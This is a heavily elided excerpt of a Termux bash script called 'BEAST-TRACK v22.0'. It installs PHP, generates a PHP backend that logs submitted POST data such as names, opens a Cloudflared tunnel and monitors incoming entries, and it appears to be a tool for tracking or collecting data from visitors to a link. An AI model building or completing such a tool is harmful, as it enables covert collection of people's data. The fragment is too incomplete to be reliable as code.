...
# --- BEAST-TRACK v22.0 (STABLE NO-ERROR EDITION) ---
...
# --- DEPENDENCY CHECK ---
if ! command -v php &> /dev/null; then pkg install php -y; fi
...
# --- GENERATE COMPATIBLE PHP BACKEND ---
...
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (\$type == 'init') {
        ...
        \$log .= "\033[1;37m┃ NAME      :\033[0m " . \$name . "\n";
...
echo -e "${BCyan}[*] Initializing Cloudflared (Waiting 20s)...${NC}"
...
echo -e "${PYellow}--------------------------------------------------"
echo -e "  MONITORING... (Press Ctrl+C to stop)${NC}"
